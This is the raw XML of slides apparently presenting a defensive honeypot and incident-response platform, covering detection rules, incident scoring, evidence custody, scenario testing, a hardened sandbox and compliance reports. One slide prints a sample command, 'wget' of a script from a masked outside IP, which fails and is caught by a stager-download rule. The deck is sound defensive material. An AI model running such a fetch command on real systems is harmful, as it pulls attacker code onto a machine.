              </a:rPr>
              <a:t>post-exploitation command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444398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T1059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9992" y="44439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st-exec-004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4439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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>stager download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444398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T1105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59" y="47000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st-exec-005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62088" y="47000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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>suspicious PowerShell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67928" y="4700016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T1059.001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9992" y="47000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st-recon-006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04120" y="47000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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>port and service scan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09960" y="4700016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Courier New"/>
              </a:rPr>
              <a:t>T1046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5212080"/>
            <a:ext cx="11055096" cy="969264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" y="5212080"/>
            <a:ext cx="32004" cy="969264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" y="5358384"/>
            <a:ext cx="10597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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WHAT A DETECTION CARRIES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" y="5596128"/>
            <a:ext cx="105796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Every detection row stores the events it matched, a reason written in plain language, a confidence value, a severity and the ATT&amp;CK technique. A deduplication key and a processing cursor mean that re-running the engine over the same events produces no additional detections.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 animBg="1"/>
      <p:bldP spid="31" grpId="0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 animBg="1"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48" grpId="0"/>
      <p:bldP spid="49" grpId="0" animBg="1"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0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Correlation and incident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Severity is calculated, and the calculation is stored next to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773936"/>
            <a:ext cx="5358384" cy="407822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195681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Courier New"/>
              </a:rPr>
              <a:t>INC-000142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91456" y="1975104"/>
            <a:ext cx="859536" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1618">
              <a:alpha val="94000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="5A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1975104"/>
            <a:ext cx="8595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85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New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230428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Courier New"/>
              </a:rPr>
              <a:t>source 185.***.***.42   ·   6 detections   ·   4 techniques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7" y="2615184"/>
            <a:ext cx="480974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27614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RISK BREAKDOWN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3054096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severity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57984" y="3108960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57984" y="3108960"/>
            <a:ext cx="1097280" cy="9144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305409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77056" y="3054096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highest severity rank times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43814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detections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57984" y="3493008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57984" y="3493008"/>
            <a:ext cx="365759" cy="91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8416" y="343814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7056" y="3438144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6 detections times 6, limit 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3822191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techniques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57984" y="3877055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57984" y="3877055"/>
            <a:ext cx="304800" cy="91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28416" y="3822191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7056" y="3822191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4 techniques times 5, limit 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" y="4206240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event risk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57984" y="4261103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57984" y="4261103"/>
            <a:ext cx="173735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28416" y="420624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11.4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77056" y="4206240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event risk times 0.15, limit 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7" y="4590288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session size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57984" y="4645151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57984" y="4645151"/>
            <a:ext cx="124967" cy="914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28416" y="459028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8.2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77056" y="4590288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session events times 0.2, limit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7" y="4974336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linked malware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57984" y="5029199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28416" y="497433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77056" y="4974336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no stored sample analysis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7" y="5431536"/>
            <a:ext cx="480974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7" y="554126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9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>total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52928" y="5449824"/>
            <a:ext cx="896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>
                <a:solidFill>
                  <a:srgbClr val="35C0E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>86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77056" y="5541264"/>
            <a:ext cx="1792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upper limit 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1824228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1773936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Grouped by source, bounded by time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2020824"/>
            <a:ext cx="51755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Activity from one source joins an open incident for six hours. Past that point a new incident is opened instead.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2848356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2798064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A reconstructed timeline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46520" y="3044952"/>
            <a:ext cx="51755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Detections, raw events, session commands and analyst actions merge into one ordered account of the intrusion.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3872483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3822191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Linked indicators and techniques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4069079"/>
            <a:ext cx="51755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URLs, domain names and file hashes are extracted from the matched events and stored against the incident, deduplicated by type and value.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4896612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6520" y="4846320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An analyst audit trail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5093208"/>
            <a:ext cx="51755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Every status change, note and evidence attachment is recorded against the incident with an author and a timestamp.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5870448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Tahoma"/>
              </a:rPr>
              <a:t>The correlation cycle runs about every 20 seconds over a two-hour lookback window.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 animBg="1"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0" animBg="1"/>
      <p:bldP spid="53" grpId="0" animBg="1"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57" grpId="0" animBg="1"/>
      <p:bldP spid="58" grpId="0" animBg="1"/>
      <p:bldP spid="59" grpId="0"/>
      <p:bldP spid="60" grpId="0"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0" animBg="1"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0"/>
      <p:bldP spid="65" grpId="0" animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0"/>
      <p:bldP spid="72" grpId="0" animBg="1"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0"/>
      <p:bldP spid="75" grpId="0" animBg="1"/>
      <p:bldP spid="76" grpId="0"/>
      <p:bldP spid="77" grpId="0"/>
      <p:bldP spid="78" grpId="0" animBg="1"/>
      <p:bldP spid="79" grpId="0"/>
      <p:bldP spid="80" grpId="0"/>
      <p:bldP spid="81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Evidence and chain of custody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00784"/>
            <a:ext cx="5358384" cy="32186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188366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STORED WITH EVERY EVIDENCE ITEM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" y="2244852"/>
            <a:ext cx="82296" cy="822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2194560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content_hash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219456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SHA-256 of the evidence blob, computed on arrival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" y="2610612"/>
            <a:ext cx="82296" cy="822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2560320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immutable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256032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true by default; items are added, never edited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" y="2976372"/>
            <a:ext cx="82296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" y="2926080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collected_by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292608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authenticated analyst who attached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" y="3342132"/>
            <a:ext cx="82296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" y="3291840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collected_at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329184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UTC timestamp written at attachment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" y="3707891"/>
            <a:ext cx="82296" cy="82296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" y="3657600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incident_id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65760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incident the item belongs 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4964" y="4073652"/>
            <a:ext cx="82296" cy="82296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0704" y="4023360"/>
            <a:ext cx="1389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access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" y="4023360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one authenticated endpoint, never a file path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7" y="4370832"/>
            <a:ext cx="480974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7" y="4498848"/>
            <a:ext cx="4809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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>An analyst can hash a stored item months later and show that it is the artefact that was collected, or show that it is not.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700784"/>
            <a:ext cx="5358384" cy="32186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59" y="1883664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WHERE DANGEROUS ARTEFACTS ARE HELD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59" y="2194560"/>
            <a:ext cx="4809744" cy="384048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56832" y="2340864"/>
            <a:ext cx="91440" cy="9144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67144" y="21945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backend/quarantine/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50808" y="21945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Tahoma"/>
              </a:rPr>
              <a:t>captured malware samples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37959" y="2670048"/>
            <a:ext cx="4809744" cy="384048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56832" y="2816352"/>
            <a:ext cx="91440" cy="91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67144" y="267004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backend/evidence/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50808" y="267004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Tahoma"/>
              </a:rPr>
              <a:t>incident evidence blobs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58534" y="3284982"/>
            <a:ext cx="68580" cy="6858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57416" y="3218688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Neither directory is served by the web server or committed to the repository.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58534" y="3760470"/>
            <a:ext cx="68580" cy="6858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57416" y="3694176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Samples leave only through an authenticated download endpoint.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58534" y="4235958"/>
            <a:ext cx="68580" cy="6858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57416" y="4169664"/>
            <a:ext cx="4572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That isolation is asserted by an automated test, not only documented.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5102352"/>
            <a:ext cx="11055096" cy="1042415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5102352"/>
            <a:ext cx="32004" cy="1042415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672" y="5248656"/>
            <a:ext cx="10597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TIMELINE RECONSTRUCTION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" y="5486400"/>
            <a:ext cx="10579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The timeline builder merges normalised events, detections, session commands and analyst activity into a single ordered account of the intrusion. That account is what an examiner actually reads, and it is the backbone of the forensic report.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39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0" animBg="1"/>
      <p:bldP spid="46" grpId="0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 animBg="1"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0" animBg="1"/>
      <p:bldP spid="57" grpId="0" animBg="1"/>
      <p:bldP spid="58" grpId="0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 animBg="1"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69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Attacker behaviour and ATT&amp;CK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805939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1755648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A temporal interaction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002536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Sessions, source addresses, commands and observed indicators become nodes and edges over a rolling thirty-day window.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884932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2834639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Real graph mathematics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081527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Centrality and connected components are computed with networkx, so the figures shown in the interface are calculated rather than estimated.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63923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3913631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Method, not identity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160519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Activity is classified as an automated scanner, a credential-stuffing bot or hands-on-keyboard work, using timing, entropy and command variety.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042916"/>
            <a:ext cx="25603" cy="141732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992624"/>
            <a:ext cx="5175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Tahoma"/>
              </a:rPr>
              <a:t>No threat-actor attribution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239512"/>
            <a:ext cx="517550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The platform never names a known group. Nothing a honeypot observes can support that claim, so the claim is not made.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737360"/>
            <a:ext cx="5358384" cy="424281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59" y="19202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ATT&amp;CK COVERAGE BY TACTIC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59" y="21396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Tahoma"/>
              </a:rPr>
              <a:t>54 techniques are referenced across the rules, scenarios and analysis engines.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59" y="243230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Reconnaissance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67928" y="249631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50807" y="249631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33688" y="249631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16567" y="249631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99448" y="2496312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82328" y="2496312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93224" y="24323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0424" y="24323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59" y="269290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Initial Access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67928" y="275691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50807" y="275691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33688" y="275691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16567" y="275691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99448" y="275691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82328" y="2756916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93224" y="269290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50424" y="26929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59" y="295351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Execution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67928" y="301752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50807" y="301752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301752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16567" y="301752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99448" y="301752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82328" y="301752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93224" y="295351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50424" y="295351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59" y="321411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Persistence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67928" y="327812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50807" y="327812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33688" y="327812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16567" y="327812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99448" y="327812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482328" y="327812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93224" y="32141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50424" y="32141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7959" y="34747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Privilege Escalation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67928" y="3538727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50807" y="3538727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33688" y="3538727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16567" y="3538727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99448" y="3538727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482328" y="3538727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93224" y="34747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0424" y="347472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37959" y="373532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Defense Evasion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67928" y="379933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50807" y="379933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933688" y="379933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116567" y="379933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299448" y="379933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482328" y="379933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93224" y="37353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50424" y="37353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37959" y="399592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Credential Access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67928" y="405993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50807" y="405993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33688" y="405993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116567" y="405993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299448" y="4059936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482328" y="4059936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93224" y="39959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50424" y="399592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7959" y="425653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Discovery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567928" y="432054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750807" y="432054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933688" y="432054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16567" y="432054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299448" y="4320540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82328" y="4320540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793224" y="425653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50424" y="42565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37959" y="451713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Lateral Movement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67928" y="458114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750807" y="458114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933688" y="458114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116567" y="4581144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99448" y="4581144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482328" y="4581144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93224" y="451713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50424" y="451713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37959" y="47777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Collection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567928" y="4841748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750807" y="4841748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933688" y="4841748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116567" y="4841748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99448" y="4841748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482328" y="4841748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93224" y="47777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50424" y="47777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537959" y="503834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Command and Control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567928" y="510235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50807" y="510235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933688" y="510235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16567" y="510235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99448" y="5102352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482328" y="5102352"/>
            <a:ext cx="128016" cy="100584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93224" y="503834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50424" y="503834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537959" y="529894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Exfiltration and Impact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567928" y="536295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50807" y="536295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33688" y="536295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116567" y="536295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99448" y="536295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482328" y="5362956"/>
            <a:ext cx="128016" cy="10058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93224" y="52989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250424" y="529894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techniques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37959" y="5577840"/>
            <a:ext cx="480974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37959" y="5669280"/>
            <a:ext cx="4809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Tahoma"/>
              </a:rPr>
              <a:t>A technique is counted only where a rule, a scenario or an engine references it.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6928" y="6089904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Tahoma"/>
              </a:rPr>
              <a:t>Measured signals support a claim about method, not a claim about identity.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4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4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42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2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2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42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4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42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2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4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4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4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4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4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42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4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4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42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4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42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42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42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42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4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42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42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4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42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42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4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42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42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42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42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42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42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42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2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4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42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42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42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42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 animBg="1"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40" grpId="0" animBg="1"/>
      <p:bldP spid="41" grpId="0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/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0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/>
      <p:bldP spid="78" grpId="0"/>
      <p:bldP spid="79" grpId="0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87" grpId="0"/>
      <p:bldP spid="88" grpId="0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/>
      <p:bldP spid="96" grpId="0"/>
      <p:bldP spid="97" grpId="0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/>
      <p:bldP spid="105" grpId="0"/>
      <p:bldP spid="106" grpId="0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/>
      <p:bldP spid="114" grpId="0"/>
      <p:bldP spid="115" grpId="0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/>
      <p:bldP spid="123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/>
      <p:bldP spid="132" grpId="0"/>
      <p:bldP spid="133" grpId="0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/>
      <p:bldP spid="141" grpId="0"/>
      <p:bldP spid="142" grpId="0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/>
      <p:bldP spid="150" grpId="0"/>
      <p:bldP spid="151" grpId="0" animBg="1"/>
      <p:bldP spid="152" grpId="0"/>
      <p:bldP spid="153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Detection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Eight controlled scenarios are fired at the honeypots, and the detections the real pipeline produces are graded against what the scenario expected.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938528"/>
            <a:ext cx="2606040" cy="168249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938528"/>
            <a:ext cx="32004" cy="1682496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" y="2121408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2121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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Fire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2816352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A scenario replays a known attack: brute force, reconnaissance, exfiltration or PowerShell abuse.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1256" y="2775204"/>
            <a:ext cx="118871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3282696" y="273405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1938528"/>
            <a:ext cx="2606040" cy="168249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80" y="1938528"/>
            <a:ext cx="32004" cy="1682496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02736" y="2121408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2736" y="2121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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New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2736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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Wait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2736" y="2816352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One full detection cycle passes. Nothing is injected into the engine and no detection is fabricated.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07608" y="2775204"/>
            <a:ext cx="118871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5400000">
            <a:off x="6099048" y="273405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1938528"/>
            <a:ext cx="2606040" cy="168249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9632" y="1938528"/>
            <a:ext cx="32004" cy="1682496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19088" y="2121408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2121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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Grade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2816352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Real detections are matched against the expected set, giving a detection rate and ATT&amp;CK coverage.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2775204"/>
            <a:ext cx="118871" cy="914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8915400" y="2734056"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="triangle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15984" y="1938528"/>
            <a:ext cx="2606040" cy="168249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15984" y="1938528"/>
            <a:ext cx="32004" cy="16824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35440" y="2121408"/>
            <a:ext cx="256032" cy="256032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2121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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Record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2816352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A verdict of PASS, PARTIAL or FAIL is written to a scenario run row together with its evidence.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858768"/>
            <a:ext cx="5358384" cy="1975104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7" y="40416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SCENARIO LIBRARY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7250" y="4414266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8992" y="435254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ssh_brute_force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17570" y="4414266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39311" y="4352544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credential_attack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7250" y="4761738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8992" y="470001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reconnaissance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17570" y="4761738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39311" y="470001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web_attack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7250" y="5109209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8992" y="504748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malware_download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17570" y="5109209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39311" y="504748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suspicious_command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7250" y="5456682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89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suspicious_powershell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7570" y="5456682"/>
            <a:ext cx="77724" cy="7772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39311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9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>exfiltration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63640" y="3858768"/>
            <a:ext cx="5358384" cy="1975104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5A2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63640" y="3858768"/>
            <a:ext cx="32004" cy="1975104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37959" y="404164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F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WHY THIS IS SAFE TO INCLUDE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37959" y="43708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The target is fixed in code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7959" y="4572000"/>
            <a:ext cx="4773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analyst never supplies one, and execution is locked to the loopback address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37959" y="48280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A second, independent check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37959" y="5029200"/>
            <a:ext cx="4773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scenario script refuses any target outside private or loopback ranges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59" y="52852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An evaluate-only mode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37959" y="5486400"/>
            <a:ext cx="4773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a run can grade telemetry that already exists without firing anything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6016752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Tahoma"/>
              </a:rPr>
              <a:t>A detection pipeline that has never been run against a known attack has not been tested.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 animBg="1"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0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 animBg="1"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0" animBg="1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 animBg="1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The analysis sandbox and analysis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00784"/>
            <a:ext cx="5358384" cy="2670048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F151B">
              <a:alpha val="96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1700784"/>
            <a:ext cx="32004" cy="2670048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3" y="1837944"/>
            <a:ext cx="91440" cy="9144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" y="1837944"/>
            <a:ext cx="91440" cy="91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61287" y="1837944"/>
            <a:ext cx="91440" cy="914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6464" y="17922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Courier New"/>
              </a:rPr>
              <a:t>analysis sandbox  ·  session a7f3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" y="2084831"/>
            <a:ext cx="4956048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223113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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>analyst@sandbox:~$ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>uname -a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248716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Linux sandbox 6.1.0 x86_64 GNU/Linux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274320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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>analyst@sandbox:~$ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>wget http://185.x.x.42/x.sh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29992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85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>connect: Network is unreachable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325526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5112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captured as event  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>honeypot_type=AnalysisShell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6732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matched rule  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>st-exec-004</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  stager download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0233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6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>technique  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1105</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  and a graph node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1700784"/>
            <a:ext cx="5358384" cy="267004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1883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SANDBOX HARDENING, ENFORCED BEFORE START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51676" y="2244852"/>
            <a:ext cx="82296" cy="822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57416" y="21945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internal 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219456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Tahoma"/>
              </a:rPr>
              <a:t>no outbound access at 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51676" y="2555748"/>
            <a:ext cx="82296" cy="822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57416" y="250545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no Docker socket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25054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Tahoma"/>
              </a:rPr>
              <a:t>the sandbox cannot reach the daemon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51676" y="2866644"/>
            <a:ext cx="82296" cy="822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57416" y="28163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no host mounts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81635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Tahoma"/>
              </a:rPr>
              <a:t>nothing of the host is visible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51676" y="3177540"/>
            <a:ext cx="82296" cy="82296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57416" y="312724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all capabilities dropped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312724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Tahoma"/>
              </a:rPr>
              <a:t>plus no-new-privileges and a non-root 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51676" y="3488436"/>
            <a:ext cx="82296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57416" y="343814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512 MB, 1 CPU, 128 processes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343814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Tahoma"/>
              </a:rPr>
              <a:t>fixed resource ceilings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51676" y="3799331"/>
            <a:ext cx="82296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57416" y="3749039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time limit and idle reaping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3749039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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>one live sandbox per user, then reclaimed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59" y="4059936"/>
            <a:ext cx="4809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Tahoma"/>
              </a:rPr>
              <a:t>Events are tagged, so analyst activity never counts as attacker telemetry.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572000"/>
            <a:ext cx="3538728" cy="1536192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672" y="4754880"/>
            <a:ext cx="475488" cy="475488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6" name="Picture 65" descr="box_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873752"/>
            <a:ext cx="237744" cy="23774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389888" y="480974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Binary analysis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" y="5321808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Header and section parsing, YARA signature matching, ClamAV scanning and a detector covering over thirty kinds of hardcoded secret.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5112" y="4572000"/>
            <a:ext cx="3538728" cy="1536192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62856" y="4754880"/>
            <a:ext cx="475488" cy="475488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1" name="Picture 70" descr="scan__in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873752"/>
            <a:ext cx="237744" cy="23774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148072" y="480974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Android package inspection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2856" y="5321808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A MobSF-backed engine reads the manifest, the requested permissions, the exported components and the signing certificate.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83296" y="4572000"/>
            <a:ext cx="3538728" cy="1536192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21040" y="4754880"/>
            <a:ext cx="475488" cy="475488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6" name="Picture 75" descr="globe__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4873752"/>
            <a:ext cx="237744" cy="2377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906256" y="480974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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>URL inspection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321808"/>
            <a:ext cx="30723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Live DNS resolution, certificate inspection and an HTTP probe, plus entropy and look-alike character checks, registration lookup and geolocation.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44" grpId="0"/>
      <p:bldP spid="45" grpId="0" animBg="1"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0" animBg="1"/>
      <p:bldP spid="52" grpId="0"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54" grpId="0" animBg="1"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57" grpId="0" animBg="1"/>
      <p:bldP spid="58" grpId="0"/>
      <p:bldP spid="59" grpId="0"/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0" animBg="1"/>
      <p:bldP spid="65" grpId="0" animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0" animBg="1"/>
      <p:bldP spid="71" grpId="0"/>
      <p:bldP spid="72" grpId="0"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0" animBg="1"/>
      <p:bldP spid="75" grpId="0" animBg="1"/>
      <p:bldP spid="76" grpId="0"/>
      <p:bldP spid="77" grpId="0"/>
      <p:bldP spid="78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Compliance and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00784"/>
            <a:ext cx="5358384" cy="186537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1883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49 TRUST SERVICES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21762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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>CC1 to CC9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21762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common criteria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3087" y="2231136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33087" y="2231136"/>
            <a:ext cx="1097280" cy="914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21762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24323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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>A1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24323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availability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33087" y="2487168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33087" y="2487168"/>
            <a:ext cx="99752" cy="914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85232" y="243230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268833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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>C1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268833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confidentiality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33087" y="2743200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33087" y="2743200"/>
            <a:ext cx="66501" cy="914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85232" y="2688336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294436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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PI1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29443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processing integrity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3087" y="2999232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33087" y="2999232"/>
            <a:ext cx="99752" cy="914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5232" y="294436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" y="32004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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>P1 to P8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32004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privacy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33087" y="3255264"/>
            <a:ext cx="1097280" cy="914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33087" y="3255264"/>
            <a:ext cx="266007" cy="9144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85232" y="320040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E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New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3712463"/>
            <a:ext cx="5358384" cy="2139696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7" y="389534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HOW EACH CONTROL IS SCORED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7" y="4206240"/>
            <a:ext cx="822960" cy="25603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7" y="420624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3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>met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92224" y="42062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collected evidence satisfies the criterion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7" y="4590288"/>
            <a:ext cx="822960" cy="25603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459028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D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>partial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92224" y="459028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evidence exists but does not fully satisfy it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7" y="4974336"/>
            <a:ext cx="822960" cy="25603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7" y="49743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85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gap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92224" y="497433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evidence contradicts the criterion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7" y="5358383"/>
            <a:ext cx="822960" cy="256032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7" y="5358383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5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>manual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92224" y="5358383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it cannot be judged from system data, and is never passed automatically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7" y="5779008"/>
            <a:ext cx="4809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E7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>25 collectors query the running system for that evidence.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17007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EIGHT GENERATED REPORTS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1993392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28231" y="2048256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Executive summary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28231" y="2240280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dashboard statistics, detections, incidents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06840" y="1993392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71432" y="2048256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Geographic threat intelligence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71432" y="2240280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events joined to IP geolocation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63640" y="2560320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28231" y="2615184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Incident report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28231" y="2807208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detections, timeline, evidence, analyst activity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06840" y="2560320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71432" y="2615184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Forensic report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71432" y="2807208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sessions, command history, behaviour analysis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3127248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28231" y="318211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Captured credentials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28231" y="3374136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parsed login payloads and the issuance audit trail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06840" y="3127248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71432" y="318211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Detection validation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71432" y="3374136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scenario runs graded against real detections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63640" y="3694176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28231" y="3749039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Malware analysis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28231" y="3941064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static parsing, YARA, ClamAV and secret findings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06840" y="3694176"/>
            <a:ext cx="2596896" cy="47548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71432" y="3749039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  <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>SOC 2 readiness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71432" y="3941064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E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>the 49 controls scored from live evidence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63640" y="4315968"/>
            <a:ext cx="5358384" cy="1536192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63640" y="4315968"/>
            <a:ext cx="32004" cy="1536192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37959" y="448056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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PROVENANCE PRINTED ON EVERY COVER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37959" y="4754880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generated by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37959" y="49103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the authenticated operator who ran it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79992" y="4754880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generated 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79992" y="49103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in UTC, with the operator's local time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37959" y="510235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data window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37959" y="525780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the exact interval the report covers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79992" y="510235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source systems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79992" y="525780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which subsystems were queried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7959" y="5449824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row counts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37959" y="56052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how many records each query returned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79992" y="5449824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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>document hash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79992" y="56052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SHA-256 of the rendered file itself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6035040"/>
            <a:ext cx="11055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29922"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>This is an internal readiness self-assessment. A SOC 2 attestation requires an independent licensed audit firm, and the product says so.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4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4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/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0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 animBg="1"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0" animBg="1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/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0"/>
      <p:bldP spid="63" grpId="0" animBg="1"/>
      <p:bldP spid="64" grpId="0"/>
      <p:bldP spid="65" grpId="0"/>
      <p:bldP spid="66" grpId="0" animBg="1"/>
      <p:bldP spid="67" grpId="0"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69" grpId="0"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0" animBg="1"/>
      <p:bldP spid="72" grpId="0"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0" animBg="1"/>
      <p:bldP spid="75" grpId="0"/>
      <p:bldP spid="76" grpId="0"/>
